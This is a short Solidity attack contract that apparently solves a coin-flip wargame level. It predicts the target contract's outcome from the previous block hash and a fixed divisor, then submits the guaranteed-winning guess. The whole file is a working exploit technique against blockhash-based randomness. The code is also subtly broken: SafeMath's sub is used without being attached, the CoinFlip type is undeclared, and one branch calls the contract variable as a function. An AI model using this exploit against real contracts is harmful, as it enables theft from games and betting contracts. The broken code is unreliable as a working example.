// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
contract CoinFlipAttk {

    CoinFlip public originalCoinFlip = CoinFlip("INSTANCE ADDRESS");
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipAttack(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            originalCoinFlip.flip(_guess);
        } else {
            originalCoinFlip(!_guess);
        }
    }
}
